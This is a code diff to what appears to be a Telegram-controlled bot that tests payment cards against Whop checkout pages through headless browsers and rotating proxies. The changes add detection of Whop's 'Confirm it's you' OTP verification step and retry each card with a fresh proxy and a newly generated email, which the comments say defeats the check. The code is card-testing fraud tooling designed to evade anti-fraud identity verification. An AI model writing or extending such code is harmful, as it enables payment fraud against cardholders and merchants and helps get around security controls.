@@ -173,11 +173,12 @@ def test_proxy(s):
 
 
 def load_failed(res):
-    """True only when the browser never got past page-load (goto timeout, form
-    not mounted, 'Get access' not found). In those cases NO charge happened, so
-    it is safe to retry the same card on the NEXT proxy. We deliberately exclude
-    post-submit outcomes (declined / unclear / watchdog) where a charge may have
-    already occurred — never retry those."""
+    """True when the browser never got past page-load (goto timeout, form not
+    mounted, 'Get access' not found) OR Whop showed the "Confirm it's you" OTP
+    gate. Either way NO charge happened, so it is safe to retry that card on a
+    FRESH proxy + FRESH email (a new device identity won't get the OTP). We
+    deliberately exclude post-submit outcomes (declined / unclear / watchdog)
+    where a charge may have already occurred — never retry those."""
     if res.get("status") != "error":
         return False
     r = (res.get("response") or "").lower()
@@ -185,8 +186,30 @@ def load_failed(res):
         return False
     markers = ("could not load", "checkout form did not load", "could not click",
                "navigating to", "timeout", "timed out", "exceeded", "goto",
-               "proxy connection", "timeouterror")
+               "proxy connection", "timeouterror",
+               "verification required", "confirm its you", "confirm it's you",
+               "enter the code", "we sent a code", "saved information",
+               "logging in as", "device will be remembered", "verification code")
     return any(m in r for m in markers)
+
+
+# process-wide set of emails already used, so we never re-submit one Whop may
+# have registered (that's what triggers the "Confirm it's you" OTP).
+_used_emails = set()
+_used_emails_lock = threading.Lock()
+
+
+def fresh_email():
+    """Generate an email guaranteed not to have been used in this process."""
+    with _used_emails_lock:
+        for _ in range(50):
+            e = W.random_email()
+            if e not in _used_emails:
+                _used_emails.add(e)
+                return e
+        e = W.random_email()
+        _used_emails.add(e)
+        return e
 
 
 def add_proxies_tested(chat_id, text):
@@ -361,10 +384,11 @@ def run_check(chat_id, url, proxy_list, ccs_override=None):
         res = None
         for k in range(npx):
             px = proxy_list[(start_idx + k) % npx] if proxy_list else None
+            em = fresh_email()   # new email + new proxy each attempt avoids OTP
             try:
                 with BROWSER_SEM:
                     res = W.run_checkout(url, cc, proxy=px, headless=True,
-                                         tag=f"tg_{cc['number'][-4:]}")
+                                         tag=f"tg_{cc['number'][-4:]}", email=em)
             except Exception as e:
                 import traceback as _tb
                 _tb_text = _tb.format_exc()
@@ -518,10 +542,12 @@ def run_ref_flow(chat_id, ccs, proxy_list):
         res = None
         for k in range(npx if npx else 1):
             px = proxy_list[(start + k) % npx] if npx else None
+            em = fresh_email()   # new email + new proxy each attempt avoids OTP
             try:
                 with BROWSER_SEM:
                     res = F.run_final(cc_override=cc, proxy=px, headless=True,
-                                      submit=True, tag=f"ref_{cc['number'][-4:]}")
+                                      submit=True, tag=f"ref_{cc['number'][-4:]}",
+                                      email=em)
             except Exception as e:
                 import traceback as _tb
                 _tb_text = _tb.format_exc()
